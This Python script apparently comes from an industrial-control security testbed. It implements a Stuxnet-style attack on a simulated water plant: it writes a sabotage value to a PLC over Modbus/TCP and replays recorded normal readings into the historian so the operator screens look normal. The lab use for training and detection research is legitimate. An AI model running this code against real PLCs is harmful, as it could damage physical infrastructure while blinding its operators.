#!/usr/bin/env python3
"""attacker/attack_stuxnet_replay.py — Vector de Ataque Telemetry Replay (Stuxnet Pattern)

Inspirado en el ataque Stuxnet (2010):
  1. Graba telemetría normal de la planta industrial (baseline).
  2. Reproduce (replay) la telemetría normal hacia el Historian TSDB y HMI.
  3. Sabotea el proceso físico real escribiendo condiciones críticas en el PLC Modbus/TCP (`10.0.3.10:502`).
  4. Mide la divergencia entre el estado físico real (leído del PLC) y la telemetría enmascarada en el Historian.
"""
from __future__ import annotations

import argparse
import logging
import sys
import time
from pathlib import Path
from typing import Dict, List, Any, Optional, Sequence

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    from pymodbus.client import ModbusTcpClient

from network.historian import HistorianTSDB
from physical.water.plant_water import TwoStageWaterPlant

logging.basicConfig(level=logging.INFO, format='[%(asctime)s][STUXNET-REPLAY] %(message)s')
LOGGER = logging.getLogger('attack_stuxnet_replay')


class StuxnetReplayAttack:
    """Ataque Replay con sabotaje físico y verificación de divergencia telemetría vs proceso."""

    HR_PROCESS: int = 20  # Holding register para variable de proceso (nivel/presión × 10)

    def __init__(self) -> None:
        self.recorded_telemetry: List[Dict[str, Any]] = []

    def record_normal_baseline(self, samples: int = 5) -> List[Dict[str, Any]]:
        LOGGER.info("Grabando baseline de telemetría normal (%d muestras)...", samples)
        plant = TwoStageWaterPlant()
        self.recorded_telemetry = []
        for i in range(samples):
            t1, t2 = plant.step(p1_cmd=True, p2_cmd=True, dt=0.5)
            self.recorded_telemetry.append({'water_t1': round(t1, 2), 'water_t2': round(t2, 2), 'status': 'NORMAL'})
        LOGGER.info("Baseline grabado exitosamente.")
        return self.recorded_telemetry

    def execute_replay_and_sabotage(
        self,
        historian: HistorianTSDB,
        sabotage_duration: int = 3,
        host: str = '127.0.0.1',
        port: int = 502,
        sabotage_value: float = 0.1
    ) -> Dict[str, Any]:
        LOGGER.info("Iniciando ataque Replay: Inyectando baseline grabado mientras se sabotea el proceso real...")

        if not self.recorded_telemetry:
            self.record_normal_baseline(samples=3)

        raw_sabotage = int(round(sabotage_value * 10))
        real_process_val = sabotage_value
        mode = 'TABLETOP_FALLBACK'

        # 1. Sabotaje real del proceso vía Modbus/TCP socket
        client = ModbusTcpClient(host, port=port, timeout=1.0)
        try:
            if client.connect():
                client.write_register(self.HR_PROCESS, raw_sabotage)
                rr = client.read_holding_registers(self.HR_PROCESS, 1)
                if rr is not None and not rr.isError():
                    real_process_val = rr.registers[0] / 10.0
                    mode = 'SOCKET_LIVE'
                    LOGGER.info("Proceso saboteado vía Modbus TCP (%s:%d): HR %d = %.1f m³",
                                host, port, self.HR_PROCESS, real_process_val)
        except Exception as exc:
            LOGGER.warning("No se pudo conectar al PLC Modbus en %s:%d: %s. Aplicando sabotaje in-process.",
                           host, port, exc)
        finally:
            try:
                client.close()
            except Exception:
                pass

        # 2. Inyección Replay de telemetría normal al Historian
        replay_count = 0
        last_sample_t1 = 10.0
        for i in range(sabotage_duration):
            sample = self.recorded_telemetry[i % len(self.recorded_telemetry)]
            last_sample_t1 = sample['water_t1']
            historian.write_snapshot('water', sample)
            replay_count += 1
            LOGGER.info(
                "Ciclo %d — Proceso Real T1: %.1f m³ (CRÍTICO) | Telemetría Replay enviada a HMI: %.1f m³ (NORMAL)",
                i + 1, real_process_val, sample['water_t1']
            )
            time.sleep(0.02)

        # 3. Confirmar divergencia entre estado físico y telemetría reportada
        divergence_detected = abs(real_process_val - last_sample_t1) >= 1.0

        return {
            'status': 'SUCCESS',
            'mode': mode,
            'replayed_samples': replay_count,
            'real_process_val': real_process_val,
            'historian_last_val': last_sample_t1,
            'divergence_detected': divergence_detected,
            'real_process_sabotaged': True
        }


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="CityLab Stuxnet Telemetry Replay Attack Vector")
    parser.add_argument("--host", default="127.0.0.1", help="Host Modbus PLC (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=502, help="Puerto Modbus TCP (default: 502)")
    parser.add_argument("--duration", type=int, default=5, help="Duración del ataque replay en ciclos")
    parser.add_argument("--db", default="/tmp/stuxnet_test_historian.db", help="Ruta de base de datos Historian")
    args = parser.parse_args(argv)

    historian = HistorianTSDB(args.db)
    attacker = StuxnetReplayAttack()
    attacker.record_normal_baseline(samples=5)
    res = attacker.execute_replay_and_sabotage(
        historian,
        sabotage_duration=args.duration,
        host=args.host,
        port=args.port
    )
    LOGGER.info("Resultado de ataque Stuxnet: %s", res)
    return 0


if __name__ == '__main__':
    sys.exit(main())
